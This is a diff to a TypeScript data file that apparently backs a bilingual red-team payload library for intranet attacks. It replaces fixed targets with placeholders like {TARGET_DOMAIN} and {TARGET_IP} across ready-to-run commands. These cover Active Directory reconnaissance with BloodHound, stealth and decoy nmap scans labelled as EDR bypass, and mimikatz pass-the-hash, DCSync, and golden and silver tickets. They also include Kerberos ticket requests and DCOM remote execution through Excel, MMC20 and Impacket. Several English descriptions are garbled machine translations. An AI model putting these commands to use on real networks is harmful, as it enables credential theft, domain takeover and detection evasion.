@@ -33,7 +33,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: 'bloodhound-python',
-        command: 'bloodhound-python -u user -p password -d target.com -ns dc_ip',
+        command: 'bloodhound-python -u user -p password -d {TARGET_DOMAIN} -ns dc_ip',
         description: { zh: '使用Python版本采集', en: 'Collection using Python version' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -45,7 +45,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '指定域控制器', en: 'Specify Domain Controller' },
-        command: 'SharpHound.exe -c All --LdapUsername user --LdapPassword pass --DomainController dc.target.com',
+        command: 'SharpHound.exe -c All --LdapUsername user --LdapPassword pass --DomainController dc.{TARGET_DOMAIN}',
         description: { zh: '指定域控制器采集', en: 'Target a specific domain controller for collection' },
         platform: 'windows',
         syntaxBreakdown: [
@@ -164,7 +164,7 @@ export const intranetPayloads: PayloadItem[] = [
     execution: [
       {
         title: { zh: '快速扫描', en: 'Fast Scan' },
-        command: 'nmap -sS -T4 -F 192.168.1.0/24',
+        command: 'nmap -sS -T4 -F {TARGET_CIDR}',
         description: { zh: '快速扫描常用端口', en: 'Fast ScanCommonPort' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -175,16 +175,17 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '全端口扫描', en: 'Full Port Scanning' },
-        command: 'nmap -sS -p- 192.168.1.1',
+        command: 'nmap -sS -p- {TARGET_IP}',
         description: { zh: '扫描所有65535端口', en: 'Scanall65535Port' },
         platform: 'linux',
         syntaxBreakdown: [
+          { part: '-sS', explanation: { zh: 'SYN扫描，半开放扫描', en: 'SYN scan (half-open scan)' }, type: 'parameter' },
           { part: '-p-', explanation: { zh: '扫描所有端口(1-65535)', en: 'ScanallPort(1-65535)' }, type: 'parameter' }
         ]
       },
       {
         title: { zh: '服务识别', en: 'ServiceIdentify' },
-        command: 'nmap -sV -sC 192.168.1.1',
+        command: 'nmap -sV -sC {TARGET_IP}',
         description: { zh: '服务版本探测和脚本扫描', en: 'Service Version Detection and Script Scan' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -194,7 +195,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '内网存活探测', en: 'Internal networkAlive Detection' },
-        command: 'nmap -sn 192.168.1.0/24',
+        command: 'nmap -sn {TARGET_CIDR}',
         description: { zh: 'Ping扫描发现存活主机', en: 'Ping scan to discover live hosts' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -203,7 +204,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: 'Masscan快速扫描', en: 'MasscanFast Scan' },
-        command: 'masscan -p1-65535 192.168.1.0/24 --rate=1000',
+        command: 'masscan -p1-65535 {TARGET_CIDR} --rate=1000',
         description: { zh: '高速端口扫描', en: 'High-Speed Port Scanning' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -213,7 +214,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '操作系统识别', en: 'Operating SystemIdentify' },
-        command: 'nmap -O 192.168.1.1',
+        command: 'nmap -O {TARGET_IP}',
         description: { zh: '识别目标操作系统', en: 'IdentifyTargetOperating System' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -222,7 +223,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: 'UDP扫描', en: 'UDP Scan' },
-        command: 'nmap -sU --top-ports 20 192.168.1.1',
+        command: 'nmap -sU --top-ports 20 {TARGET_IP}',
         description: { zh: '扫描常用UDP端口', en: 'ScanCommonUDPPort' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -232,7 +233,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '漏洞扫描', en: 'VulnerabilityScan' },
-        command: 'nmap --script vuln 192.168.1.1',
+        command: 'nmap --script vuln {TARGET_IP}',
         description: { zh: '使用漏洞扫描脚本', en: 'UseVulnerabilityScanScript' },
         platform: 'linux',
         syntaxBreakdown: [
@@ -243,12 +244,12 @@ export const intranetPayloads: PayloadItem[] = [
     edrBypass: [
       {
         title: { zh: '隐蔽扫描', en: 'StealthyScan' },
-        command: 'nmap -sS -T2 -f --data-length 50 192.168.1.1',
+        command: 'nmap -sS -T2 -f --data-length 50 {TARGET_IP}',
         description: { zh: '低速分片扫描，添加随机数据', en: 'Low-speed fragmented scan with random data padding' }
       },
       {
         title: { zh: '诱饵扫描', en: 'Decoy scan' },
-        command: 'nmap -sS -D RND:10 192.168.1.1',
+        command: 'nmap -sS -D RND:10 {TARGET_IP}',
         description: { zh: '使用诱饵IP混淆扫描来源', en: 'Use decoy IPs to obfuscate the scan source' }
       }
     ],
@@ -832,14 +833,14 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: 'Pass-the-Hash',
-        command: 'mimikatz.exe "sekurlsa::pth /user:Administrator /domain:target.com /ntlm:HASH" "exit"',
+        command: 'mimikatz.exe "sekurlsa::pth /user:Administrator /domain:{TARGET_DOMAIN} /ntlm:HASH" "exit"',
         description: { zh: '使用NTLM哈希进行Pass-the-Hash攻击', en: 'UseNTLMhash perform Pass-the-Hash Attack' },
         platform: 'windows',
         requiresAdmin: true
       },
       {
         title: { zh: 'DCSync攻击', en: 'DCSync Attack' },
-        command: 'mimikatz.exe "lsadump::dcsync /domain:target.com /user:Administrator" "exit"',
+        command: 'mimikatz.exe "lsadump::dcsync /domain:{TARGET_DOMAIN} /user:Administrator" "exit"',
         description: { zh: '模拟DC同步获取域内所有用户哈希', en: 'Simulate DC replication to obtain all domain user hashes' },
         platform: 'windows',
         requiresAdmin: true,
@@ -858,7 +859,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '黄金票据', en: 'Golden Ticket' },
-        command: 'mimikatz.exe "kerberos::golden /domain:target.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator" "exit"',
+        command: 'mimikatz.exe "kerberos::golden /domain:{TARGET_DOMAIN} /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator" "exit"',
         description: { zh: '生成黄金票据获取域管理员权限', en: 'Generate a Golden Ticket to gain Domain Admin privileges' },
         platform: 'windows',
         requiresAdmin: true,
@@ -870,7 +871,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '白银票据', en: 'Silver Ticket' },
-        command: 'mimikatz.exe "kerberos::golden /domain:target.com /sid:S-1-5-21-xxx /target:server.target.com /service:cifs /rc4:HASH /user:Administrator" "exit"',
+        command: 'mimikatz.exe "kerberos::golden /domain:{TARGET_DOMAIN} /sid:S-1-5-21-xxx /target:server.{TARGET_DOMAIN} /service:cifs /rc4:HASH /user:Administrator" "exit"',
         description: { zh: '生成白银票据访问特定服务', en: 'GenerateSilver TicketAccessspecificService' },
         platform: 'windows',
         requiresAdmin: true
@@ -920,7 +921,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: '请求服务票据', en: 'Request Service Ticket' },
-        command: 'Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/webserver.target.com"',
+        command: 'Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/webserver.{TARGET_DOMAIN}"',
         description: { zh: 'PowerShell请求Kerberos票据', en: 'PowerShellRequestKerberosTicket' },
         platform: 'windows'
       },
@@ -1199,7 +1200,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: 'Mimikatz DCSync',
-        command: 'mimikatz.exe "lsadump::dcsync /domain:target.com /all" "exit"',
+        command: 'mimikatz.exe "lsadump::dcsync /domain:{TARGET_DOMAIN} /all" "exit"',
         description: { zh: '使用DCSync同步所有哈希', en: 'UseDCSyncSamestepallhash' },
         platform: 'windows',
         requiresAdmin: true
@@ -1436,7 +1437,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: 'Windows PtH',
-        command: 'sekurlsa::pth /user:Administrator /domain:target.com /ntlm:NTHASH',
+        command: 'sekurlsa::pth /user:Administrator /domain:{TARGET_DOMAIN} /ntlm:NTHASH',
         description: { zh: '使用Mimikatz进行PtH', en: 'UseMimikatz perform PtH' },
         platform: 'windows',
         requiresAdmin: true
@@ -1451,7 +1452,7 @@ export const intranetPayloads: PayloadItem[] = [
     edrBypass: [
       {
         title: 'Overpass-the-Hash',
-        command: 'sekurlsa::pth /user:Administrator /domain:target.com /ntlm:NTHASH /run:cmd.exe',
+        command: 'sekurlsa::pth /user:Administrator /domain:{TARGET_DOMAIN} /ntlm:NTHASH /run:cmd.exe',
         description: { zh: '将哈希转换为Kerberos票据', en: 'Convert hashes to Kerberos tickets' }
       }
     ],
@@ -3752,7 +3753,7 @@ export const intranetPayloads: PayloadItem[] = [
     execution: [
       {
         title: { zh: 'Excel DCOM激活', en: 'Excel DCOMActivate' },
-        command: '$com = [Type]::GetTypeFromProgID("Excel.Application","target.com")\n$obj = [System.Activator]::CreateInstance($com)\n$obj.Visible = $false',
+        command: '$com = [Type]::GetTypeFromProgID("Excel.Application","{TARGET_DOMAIN}")\n$obj = [System.Activator]::CreateInstance($com)\n$obj.Visible = $false',
         description: { zh: '激活Excel DCOM对象', en: 'ActivateExcel DCOM for Object' },
         platform: 'windows'
       },
@@ -3768,7 +3769,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: 'Impacket DCOM',
-        command: 'python dcomexec.py -object Excel.Application domain/user:password@target.com',
+        command: 'python dcomexec.py -object Excel.Application domain/user:password@{TARGET_DOMAIN}',
         description: { zh: '使用Impacket执行', en: 'UseImpacketExecute' },
         platform: 'linux'
       }
@@ -3792,7 +3793,7 @@ export const intranetPayloads: PayloadItem[] = [
     execution: [
       {
         title: 'MMC20.Application',
-        command: '$com = [Type]::GetTypeFromProgID("MMC20.Application","target.com")\n$obj = [System.Activator]::CreateInstance($com)\n$obj.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")',
+        command: '$com = [Type]::GetTypeFromProgID("MMC20.Application","{TARGET_DOMAIN}")\n$obj = [System.Activator]::CreateInstance($com)\n$obj.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")',
         description: { zh: '使用MMC执行命令', en: 'UseMMCExecute Command' },
         platform: 'windows',
         syntaxBreakdown: [
@@ -3802,7 +3803,7 @@ export const intranetPayloads: PayloadItem[] = [
       },
       {
         title: { zh: 'Impacket执行', en: 'ImpacketExecute' },
-        command: 'python dcomexec.py -object MMC20.Application domain/user:password@target.com',
+        command: 'python dcomexec.py -object MMC20.Application domain/user:password@{TARGET_DOMAIN}',
         description: { zh: '使用Impacket', en: 'UseImpacket' },
         platform: 'linux'
       }
